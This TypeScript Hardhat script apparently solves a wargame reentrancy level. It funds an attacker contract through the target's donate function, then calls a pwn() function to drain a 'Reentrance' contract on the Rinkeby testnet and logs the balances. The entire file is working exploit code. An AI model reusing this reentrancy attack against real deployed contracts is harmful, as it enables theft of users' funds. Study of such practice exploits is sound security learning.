import { ECDH } from "crypto"
import { providers } from "ethers"
import { ethers } from "hardhat"

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0x289ca56a317F400dFecF843A226e848583a99e64"
  const targetAbi = [
    {
      inputs: [
        {
          internalType: "address",
          name: "_who",
          type: "address",
        },
      ],
      name: "balanceOf",
      outputs: [
        {
          internalType: "uint256",
          name: "balance",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x70a08231",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      name: "balances",
      outputs: [
        {
          internalType: "uint256",
          name: "",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x27e235e3",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "_to",
          type: "address",
        },
      ],
      name: "donate",
      outputs: [],
      stateMutability: "payable",
      type: "function",
      payable: true,
      signature: "0x00362a95",
    },
    {
      inputs: [
        {
          internalType: "uint256",
          name: "_amount",
          type: "uint256",
        },
      ],
      name: "withdraw",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0x2e1a7d4d",
    },
    {
      stateMutability: "payable",
      type: "receive",
      payable: true,
    },
  ]

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const contract = await ethers.getContract("Reentrance")
  // await contract.drop(ethers.utils.parseEther("0.001"), { gasLimit: 100000 })
  const prepare1 = await target.donate(contract.address, {
    gasLimit: 500000,
    value: ethers.utils.parseEther("0.001"),
  })
  await prepare1.wait()
  const prepare2 = await contract.setAmount()
  await prepare2.wait()

  const tx = await contract.pwn({
    gasLimit: 500000,
  })

  try {
    const receipt = await tx.wait()
    console.log(
      `tx at https://rinkeby.etherscan.io/tx/${receipt.transactionHash}`
    )
  } catch (error: any) {
    console.error("Error:", error.reason)
    console.log(
      `Error tx  at https://rinkeby.etherscan.io/tx/${error?.transactionHash}`
    )
  }

  console.log(`balance of ${await target.balanceOf(contract.address)}`)
  console.log(`amount of ${await contract.s_amount()}`)

  console.log(
    `Eth target balance ${await ethers.provider.getBalance(target.address)}`
  )
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
